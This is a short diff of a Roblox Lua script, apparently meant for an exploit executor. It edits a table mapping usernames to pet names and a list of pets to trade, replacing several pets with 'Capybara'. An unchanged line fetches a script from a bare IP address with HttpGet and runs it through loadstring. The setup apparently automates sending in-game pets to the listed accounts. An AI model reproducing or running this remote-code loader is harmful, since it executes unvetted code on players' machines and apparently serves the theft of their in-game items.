@@ -5,21 +5,15 @@ repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui
 
 _G.UserKey = "1"
 _G.HostName = {
-    ["Dammebloms3581"] = "Mochi Mouse",
-    ["Kaputpappa734"] = "French Fry Ferret",
-    ["Mowenibara890"] = "Spaghetti Sloth",
-    ["Latiljabro65041"] = "Corrupted Kitsune",
-    ["Huyomo884"] = "Dragonfly",
-    ["Smockhoy28125"] = "Mimic Octopus",
+    ["Kinasramer08074"] = "Capybara",
+    ["Odemsficek078"] = "Capybara",
+    ["Faconzelen34784"] = "Capybara",
+    ["Fardzubi57714"] = "Capybara",
+    ["Kathipallo865"] = "Capybara",
 }
 
 _G.SelectPetForTrade = {
-    "Corrupted Kitsune",
-    "Mochi Mouse",
-    "French Fry Ferret",
-    "Spaghetti Sloth",
-    "Dragonfly",
-    "Mimic Octopus",
+    "Capybara",
 }
 
 loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()
